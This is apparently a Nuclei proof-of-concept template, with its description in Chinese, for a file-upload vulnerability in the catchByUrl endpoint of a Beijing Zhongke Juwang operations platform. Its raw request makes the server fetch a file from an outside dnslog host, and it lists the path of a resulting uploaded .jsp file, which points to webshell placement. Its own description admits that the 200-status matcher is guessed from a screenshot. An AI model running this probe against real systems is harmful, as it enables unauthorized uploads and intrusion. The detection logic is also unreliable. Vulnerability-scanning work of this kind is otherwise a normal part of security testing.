id: poc-ef1twkci0ggxlxxh
info:
  name: 北京中科聚网一体化运营平台catchByUrl接口存在文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'GET /resources/files/ue/catchByUrl?url=http://xxx.dnslog.cn HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate, br

    Accept: */*

    Accept-Language: en-US;q=0.9,en;q=0.8

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36

    Connection: close

    Cache-Control: max-age=0


    上传文件位置

    /files/headimg/8cc4711b-691f-4323-9c27-8a745eda90ab.jsp'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
